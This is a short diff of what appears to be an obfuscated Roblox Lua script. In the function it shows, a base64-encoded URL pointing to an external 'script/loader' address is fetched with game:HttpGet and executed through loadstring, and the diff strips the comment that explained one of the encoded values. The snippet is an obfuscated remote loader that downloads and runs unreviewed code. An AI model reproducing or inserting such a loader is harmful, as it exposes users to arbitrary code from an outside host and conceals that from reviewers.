@@ -18,7 +18,7 @@ end
 
 local _0x3C = {
 	[116495829188952] = function()
-		_G["\95\95"..math.random()] = b64d("VHFEb2tqdVlZTVZJdVBPQm1ZWktaanBXQ3J0bkdSbWlV") -- decoded: TqDokjuYYMVIuPOBmYZKjpWCrtnGRmiU
+		_G["\95\95"..math.random()] = b64d("VHFEb2tqdVlZTVZJdVBPQm1ZWktaanBXQ3J0bkdSbWlV")
 		(loadstring or load)(game:HttpGet(b64d("aHR0cHM6Ly9nZXRuYXRpdmUuY2Mvc2NyaXB0L2xvYWRlcg==")))()
 	end,
 
